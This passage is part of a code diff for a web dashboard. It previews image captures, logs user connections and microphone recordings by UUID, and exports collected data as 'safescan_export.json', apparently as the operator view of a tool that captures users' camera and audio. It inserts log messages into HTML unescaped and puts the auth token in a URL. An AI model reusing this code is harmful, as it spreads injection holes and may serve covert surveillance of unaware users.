+                <div style="font-size:0.65rem;color:rgba(255,255,255,0.3);margin-top:2px">${new Date(c.created_at).toLocaleString()}</div>
+            </div>
+        </div>
+    `).join('');
+}
+
+function openCapturePreview(url, uuid, time) {
+    const lightbox = document.getElementById('videoLightbox');
+    const lVideo = document.getElementById('lightboxVideo');
+    const lImg = document.getElementById('lightboxImg');
+    const lUuid = document.getElementById('lightboxUuid');
+    const lBadge = document.getElementById('lightboxBadge');
+    lVideo.style.display = 'none'; lVideo.srcObject = null;
+    lImg.style.display = 'block'; lImg.src = url;
+    lUuid.textContent = uuid + ' — ' + time;
+    lBadge.innerHTML = '<span class="badge-offline">CAPTURE</span>';
+    document.getElementById('lightboxSpeaker').style.display = 'none';
+    activeLightboxUser = null;
+    lightbox.classList.add('show');
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// ACTIVITY LOG
+// ═══════════════════════════════════════════════════════════════════
+async function loadActivityLog() {
+    const data = await api('/api/activity-log');
+    const tbody = document.getElementById('activityTable');
+    if (!data?.log?.length) {
+        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">No activity yet</td></tr>';
+        return;
+    }
+    const icons = { user_connect: '🟢', user_disconnect: '🔴', capture: '📸', recording: '🎤' };
+    const colors = { user_connect: '#5de4c7', user_disconnect: '#ff6b8a', capture: '#a594fd', recording: '#ffb86c' };
+    tbody.innerHTML = data.log.map(l => `
+        <tr>
+            <td><span style="color:${colors[l.type] || '#fff'}">${icons[l.type] || '•'} ${(l.type || '').replace('_',' ')}</span></td>
+            <td><span class="uuid-text">${truncUUID(l.uuid, 10)}</span></td>
+            <td style="color:rgba(255,255,255,0.6)">${l.message}</td>
+            <td style="font-size:0.75rem;color:rgba(255,255,255,0.3)">${new Date(l.timestamp).toLocaleString()}</td>
+        </tr>
+    `).join('');
+}
+
+// Listen for real-time activity
+socket.on('activity:new', (entry) => {
+    // If activity page is visible, prepend the new entry
+    if (document.getElementById('page-activity')?.classList.contains('active')) {
+        loadActivityLog();
+    }
+});
+
+// ═══════════════════════════════════════════════════════════════════
+// EXPORT DATA
+// ═══════════════════════════════════════════════════════════════════
+function exportData() {
+    window.open(API + '/api/export?token=' + TOKEN, '_blank');
+    // Fallback using fetch
+    api('/api/export').then(data => {
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = 'safescan_export.json'; a.click();
+        URL.revokeObjectURL(url);
+    }).catch(() => {});
+}
 </script>
 </body>
 </html>
